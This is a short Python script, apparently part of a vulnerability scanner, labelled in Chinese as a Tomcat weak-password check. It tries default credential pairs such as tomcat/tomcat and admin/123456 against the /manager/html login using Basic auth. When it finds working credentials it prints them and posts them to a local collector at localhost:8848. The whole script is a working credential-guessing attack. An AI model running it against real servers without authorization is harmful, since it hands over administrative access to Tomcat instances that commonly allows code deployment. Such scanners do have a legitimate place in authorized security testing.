#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Tomcat 弱口令漏洞
referer: unknown
author: Lucifer
description: tomcat 后台弱口令。
'''
import sys
import json
import base64
import requests
import warnings
from termcolor import cprint

class tomcat_weak_pass_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        userlist = ["tomcat","admin"]
        passlist = ["tomcat", "123456", "admin"]
        payload = "/manager/html"
        vulnurl = self.url + payload
        for username in userlist:
            for password in passlist:
                try:
                    headers = {
                        "Authorization":"Basic "+base64.b64encode(bytes(username.encode())+b":"+bytes(password.encode())).decode(),
                        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
                    }
                    req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                    if req.status_code == 200 and r"Applications" in req.text and r"Manager" in req.text:
                        cprint("[+]存在Tomcat 弱口令漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps({username:password}, indent=4), "red")
                        postdata = {self.url:"[+]存在Tomcat 弱口令漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps({username:password}, indent=4)}
                        requests.post('http://localhost:8848/system', json=postdata) 
                except:
                    cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = tomcat_weak_pass_BaseVerify(sys.argv[1])
    testVuln.run()
